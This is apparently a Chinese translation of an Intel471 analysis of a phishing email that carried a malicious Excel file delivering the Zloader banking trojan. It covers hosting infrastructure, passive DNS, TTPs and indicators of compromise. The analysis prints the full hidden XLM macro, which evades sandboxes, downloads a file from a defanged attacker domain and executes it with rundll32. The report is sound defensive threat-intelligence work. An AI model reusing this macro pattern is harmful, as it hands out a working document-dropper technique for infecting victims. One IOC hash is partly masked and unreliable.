**我们本周发现了一件针对团队中一名员工的攻击尝试，本文是对次攻击尝试的分析。有趣的是，员工的电子邮件地址仅在极少数外部场合披露过。本文将会讨论关于本次攻击的细节以分享
TTP，并且鼓励其他人也共享类似的事件。**

## 简介

此次发送邮件的攻击者通过将攻击基础设施隐藏在专业防弹主机（BPH）服务后，实现了良好的操作安全性（OPSEC）。

    
    
    注：防弹主机即 Bulletproof Hosting，普通主机服务会在收到投诉后终止服务，而防弹主机服务提供商通常对用户不加限制且不受第三方影响。通常被非法服务所利用，逃避执法机关的检查，在很多国家会被依法取缔。
    

与此同时，攻击者还通过过滤流量防止被调查研究人员发现最终的 Payload。攻击者在本次攻击行动中使用了一系列工具，包括 KeitaroTDS、恶意
Excel 文档生成工具与 Zloader 银行木马。

考虑到通过垃圾邮件进行投递与银行木马的使用，判断攻击者是想要从受害者账户中进行未授权的银行转账（窃取资金）。

## 电子邮件

邮件于标准时间 2020 年 3 月 23 日星期一下午 5:26:11 发送至 **@intel471.com。

文件名| 哈希（SHA256）  
---|---  
March Incoming Invoice from Seed Records.eml|
5d1bb0aef5545138feb825d5b0669ccc4a68abb4323362f2fe188e86c62aeed0  
  
发件人使用的是 AOL 邮箱、Google Chrome 浏览器与 Windows 计算机（如果 User-Agent 可信）：

    
    
    From: Annika Preston <mitchell.barbaraogde@aol.com>
    To: ****@intel471.com
    Message-ID: <973929450.719011.1584984371396@mail.yahoo.com>
    Subject: March Incoming Invoice from Seed Records
    MIME-Version: 1.0
    Content-Type: multipart/mixed;        
    boundary=”—-=_Part_719010_1408914388.1584984371396″
    References: <973929450.719011.1584984371396.ref@mail.yahoo.com>
    X-Mailer: WebService/1.1.15518 aolwebmail Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
    

### 发件人 IP 地址

该邮件是从雅虎邮箱收到的：

    
    
    Received: from sonic313-9.consmr.mail.ne1.yahoo.com
    (sonic313-9.consmr.mail.ne1.yahoo.com. [66.163.185.32])        
    by mx.google.com with ESMTPS id c76si12645930ilg.12.2020.03.23.10.26.15 for <****@intel471.com> (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128); Mon, 23 Mar 2020 10:26:16 -0700 (PDT)
    

### Excel 文档

该文档的元数据如下所示：

属性| 值  
---|---  
创建数据| 2020-02-27 10:23:09.379000  
上次保存时间| 2020-03-23 12:01:22  
Comments| q8uOfaZ1QVOMIl4NtP  
作者| N/A  
  
该文档使用了恶意 Excel 4.0 宏（XLM）下载并执行 Payload。

宏代码存在名为 `DiOAFArhpr`
的隐藏工作表中，宏代码被纵向逐字符地写入每个单元格中。由于分析工具可能无法处理这种情况，因此攻击者使用该方式来躲避检测。

宏代码为：

    
    
    =IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)
    =IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)
    =IF(GET.WORKSPACE(19),,CLOSE(TRUE))
    =IF(GET.WORKSPACE(42),,CLOSE(TRUE))
    =IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))), 
         ,CLOSE(TRUE))
    
    =CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,
         "hxxps://grpxmqnrb[.]pw/egrg4g3g",
         "c:\Users\Public\fef2fff.html",0,0)
    
    =ALERT("The workbook cannot be opened or repaired 
         by Microsoft Excel because it's corrupt.",2)
    =CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open",
         "C:\Windows\system32\rundll32.exe",
         "c:\Users\Public\fef2fff.html,DllRegisterServer",0,5)
    

通过 `hxxps://grpxmqnrb[.]pw/egrg4g3g` 请求下载的 DLL 文件被保存在
`C:\Users\Public\fef2fff.html`，随后被调用执行。

正如下面的 HTTP 请求所示，恶意服务器重定向跳转到 GitHub，并从 GitHub 上下载了该 DLL 文件：

    
    
    GET /egrg4g3g HTTP/1.1
    Host: grpxmqnrb[.]pw
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)Accept: */*
    
    HTTP/1.1 302 Found
    Server: nginx
    Date: Tue, 24 Mar 2020 13:00:34 GMT
    Content-Type: text/html; charset=UTF-8
    Content-Length: 0
    Connection: keep-alive
    Cache-Control: no-cache, no-store, must-revalidate,post-check=0,pre-check=0
    Expires: 0
    Last-Modified: Tue, 24 Mar 2020 13:00:34 GMT
    Location: hxxps://github[.]com/arntsonl/calc_security_poc/raw/master/dll/calc.dll
    Pragma: no-cache
    Set-Cookie: _subid=357bngnes3kqn;
    Expires=Friday, 24-Apr-2020 13:00:34 GMT;Max-Age=2678400;Path=/
    X-Content-Type-Options: nosniff
    

进一步分析该样本时可以发现，该样本只具备弹出 Windows 计算机的功能。除此之外，没有其他行为表现。很显然，我们发现的是的诱饵 Payload。

## 网络关联

恶意 Excel 文档包含一段恶意宏代码，从 `grpxmqnrb[.]pw` 下载文件：

创建日期| 2020-03-23T07:08:34.0Z  
---|---  
过期日期| 2021-03-23T23:59:59.0Z  
Name Server| A.DNSPOD.COM, B.DNSPOD.COM  
注册商| Namecheap  
  
该域名显然与本次攻击行动有关，该域名下可以发现 KeitaroTDS 的身影。该域名的 DNS 记录如下所示：

    
    
    ;; ANSWER SECTION:
    grpxmqnrb[.]pw. 600 IN NS c.dnspod.com.
    grpxmqnrb[.]pw. 600 IN NS b.dnspod.com.
    grpxmqnrb[.]pw. 600 IN NS a.dnspod.com.
    grpxmqnrb[.]pw. 600 IN A 8.208.28.247
    grpxmqnrb[.]pw. 600 IN SOA a.dnspod.com. domainadmin.dnspod.com. 1584947588 3600 180 1209600 180
    

如上所示，域名是通过腾讯的 [DNSPod](https://dnspod.cloud.tencent.com/) 进行管理的。而地址的 A
记录归属于阿里云。

    
    
    inetnum:        8.208.0.0 – 8.208.255.255
    netname:        ALICLOUD-GB
    descr:          Aliyun Computing Co.LTD
    

经过我们的情报分析团队的评估，该 IP 地址应为俄罗斯著名的 BPH 服务商
[yalishanda](https://krebsonsecurity.com/2019/07/meet-the-worlds-biggest-bulletproof-hoster/) 所有。攻击者使用的 yalishanda
服务提供了反向代理网络，该网络滥用了云服务提供商，例如阿里云、腾讯云、谷歌云等。该服务使用基于中文的免费 DNS 提供商 DNSPod
在反向代理网络中解析客户端域名。可以将其视为基于主机的 Fast-Flux 服务，这次攻击背后的攻击者具有访问并付费 BPH
基础设施的能力，这也进一步证明了这是一支能力强大且资源丰富的攻击组织的想法。

以下是其域名使用的 SSL 证书：

Common name| grpxmqnrb[.]pw  
---|---  
Issuer| Let’s Encrypt Authority X3  
Valid| From March 22, 2020 to June 20, 2020  
Signature Algorithm| sha256WithRSAEncryption  
Serial Number| 041117a29a27b3b4bda2f53fd1d8ab9581d9  
  
## Passive DNS

通过 Passive DNS 可以发现与 IP 地址 8.208.28.247 相关的攻击活动。

域名| 首次发现（GMT）  
---|---  
grpxmqnrb[.]pw| 2020-03-23 00:20:31| 与 Yalishanda BPH 基础设施相关  
gfhudnjv[.]xyz| 2020-03-24 03:10:29| 与 Yalishanda BPH 基础设施相关  
wgyafqtc[.]online| 2020-03-18 15:30:23| 与基于 [Excel
文档](https://www.virustotal.com/gui/file/34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa/detection)类似攻击行动相关  
wgyvjbse[.]pw| 2020-03-18 14:45:51| 确认 Zloader 控制域名  
botiq[.]xyz| 2020-03-18 14:46:16| 确认 Zloader 控制域名  
dhteijwrb[.]host| 2020-03-17 07:55:04|
与一个类似的[攻击行动](https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros)相关，也与 Yalishanda BPH 基础设施相关  
tdvomds[.]pw| 2020-03-16 17:00:00|
与几个类似的[攻击行动](https://www.joesandbox.com/analysis/215946/0/html)相关，也与
Yalishanda BPH 基础设施相关  
siloban[.]pw| 2020-03-17 07:54:50| 与
[161.117.177.248](https://www.virustotal.com/gui/ip-address/161.117.177.248)
相关，确认 Zloader 控制域名，也与 Yalishanda BPH 基础设施相关  
hxzfvomd[.]buzz| 2020-03-15 17:00:00| 与几个类似的攻击行动相关，也与 Yalishanda BPH 基础设施相关  
  
## 重构攻击

最初，我们无法通过 `hxxps://grpxmqnrb[.]pw/egrg4g3g` 下载
Payload，但是通过跟踪基础设施和活动记录能够重现攻击行动并继续进行调查。

在 VirusTotal 上对文件
[invoice-522.xls](https://www.virustotal.com/gui/file/34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa/details)
的分析可以发现，尽管通过不同的域名与文件路径进行通信，但是 IP 地址是相同的。这可能是同一攻击者的历史行动。

从此处我们成功获得了初始
Payload（06afeaf2b0b985e0d9e048ea8ef0231026cac4c03d3ddf45f6a4ab18d884505c）：

    
    
    <html>
    <head><base href="/lander/excel4_1581586732/index.html">
    <link rel="stylesheet" 
         href="resource://content-accessible/plaintext.css">
    </head>
    <body>
    =CLOSE(FALSE)
    </pre>
    </body>
    </html>
    

该 Payload 与 Amirreza Niakanlahiji 和 Pedram Amini
此前的[博客](https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros)分析的是相同攻击者。其中提到了与某些未知控制器关联的 Payload：

> hxxps://aquolepp[.]pw/milagrecf.php
>
> hxxps://dhteijwrb[.]host/milagrecf.php

我们将其识别为 Zloader 控制服务器地址。着眼于响应内容，发现了一些最近首次发现的相似 URL：

首次发现| 检出率| 网址  
---|---|---  
2020-03-19| 0/76| hxxps://wgyafqtc[.]online/fgwg24g24g  
2020-03-19| 4/76| hxxps://tdvomds[.]pw/fgwg24g24g  
2020-03-17| 0/71| hxxp://tdvomds[.]pw/12341324rfefv  
2020-03-19| 5/76| hxxps://tdvomds[.]pw/12341324rfefv  
2020-03-16| 1/71| hxxps://hxzfvomd[.]buzz/asf2f1ff  
2020-03-16| 1/71| hxxp://hxzfvomd[.]buzz/asf2f1ff  
2020-03-05| 2/71| hxxp://pjtcdnrd[.]pw/fsgbfgbfsg43  
2020-03-05| 0/71| hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43  
2020-03-04| 2/71| hxxp://wrjmkdod[.]xyz/SDFwef2fvbbe  
  
攻击行为模式变得越来越清楚，这些域名中的大多数都与显然由同一个恶意文档生成工具创建的恶意 Excel 文档相关。根据以上研究，可以将 TTP
归因于该攻击者。

## TTP

事实证明，攻击者可以使用地下犯罪分子的许多资源，并且可以通过各种工具隐藏自身。我们观察到以下 TTP：

> 通过知名供应商 Yalishanda 的 BPH 隐藏基础架构，详情请看 Brian Krebs 关于 Yalishanda
> 的[文章](https://krebsonsecurity.com/2019/07/meet-the-worlds-biggest-> bulletproof-hoster/)
>
> 使用恶意的 Excel 文档构建工具来制作垃圾邮件活动的文档
>
> 使用 KeitaroTDS 分发流量并控制基础设施架构
>
> 使用 Zlader 银行木马在失陷主机上下载其他 Payload，例如隐藏虚拟网络计算（hidden virtual network
> computing）与运行 Web 注入
>
> 使用 Let's Encrypt 签名的 SSL 证书

## IOC

IOC 指标如下所示，也提供 [CSV](https://intel471.com/Indicators-25Mar2020.csv) 格式下载。

> 8.208.28[.]247
>
> 161.117.177[.]248
>
> hxxps://wgyafqtc[.]online/fgwg24g24g
>
> hxxps://tdvomds[.]pw/fgwg24g24g
>
> hxxp://tdvomds[.]pw/12341324rfefv
>
> hxxps://tdvomds[.]pw/12341324rfefv
>
> hxxps://hxzfvomd[.]buzz/asf2f1ff
>
> hxxp://hxzfvomd[.]buzz/asf2f1ff
>
> hxxp://pjtcdnrd[.]pw/fsgbfgbfsg43
>
> hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43
>
> hxxp://wrjmkdod[.]xyz/SDFwef2fvbbe
>
> hxxps://aquolepp[.]pw/milagrecf.php
>
> hxxps://barbeyo[.]xyz/milagrecf.php
>
> hxxps://bhajkqmd[.]xyz/milagrecf.php
>
> hxxps://botiq[.]xyz/milagrecf.php
>
> hxxps://buhjike[.]host/milagrecf.php
>
> hxxps://bwambztl[.]xyz/milagrecf.php
>
> hxxps://dhteijwrb[.]host/milagrecf.php
>
> hxxps://rizoqur[.]pw/milagrecf.php
>
> hxxps://siloban[.]pw/milagrecf.php
>
> hxxps://wgyvjbse[.]pw/milagrecf.php
>
> cfe139d639d461fe731427e79bd7048849080d4d7d906d10fae764eb056f1f0b
>
> f1ced9008d9de4109844d99fc924b6e3e4a4062ed37b52ce4b5baed430d004cf
>
> 4a5d8cde14f9e8c4f1a0cf514ca084528631d6caa8aa5282a4bf8f58dbf54f33
>
> 9e5edda543358b7ead2614ff75e23d2c271cb917a89003fa8733d9d730950507
>
> 30175739414fa301617ed6f0234992f1b3bc67a8547185cd332ad42c5a170486
>
> 34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa
>
> 8021084f2d006101e0522f62de9c1e22ec55a6639e792dc7eff2826c013597a9
>
> e81d729e1b810215940eb96e1de3e9500f522e9ba16bca2f9d49113fb462bb4d
>
> 0889271c721391d625a19391275f0e6bf244a5548a1a6eb673c6e16a48e960e1
>
> 3703d42ee0a6c4115295f14f3980cf205f7e6fb77ed0301c845431728015c812
>
> 3f2cf070e3740514c4e0dd431392a6727250a9ad3425c5b25ffad2d9d3b74716
>
> 66f49a261b6086dfdd1c3e2a21f7cb746aa35707490cbd64693d66383ba54c64
>
> 776fee630d6f89a7a01c5903de93fbd9f12f5cba8df148330a8c6f0cd267890b
>
> 945e3e4f52d30e07a281b20f96bf7150234c18aa4373c683dee74a194b57dcc0
>
> a347f8b4a17dffa05a4fe9602cf99302201220e7000***26798dd3d8db7b2b7f
>
> ac60a7471ee5297b9cefb5b3d1c1dbec4b7bf328c8b8649529202a1381acb2a5

 ***参考来源：[Intel471](https://blog.intel471.com/2020/03/25/analysis-of-an-attempted-attack-against-intel-471/)，FB 小编 Avenger 编译，转载请注明来自 FreeBuf.COM**

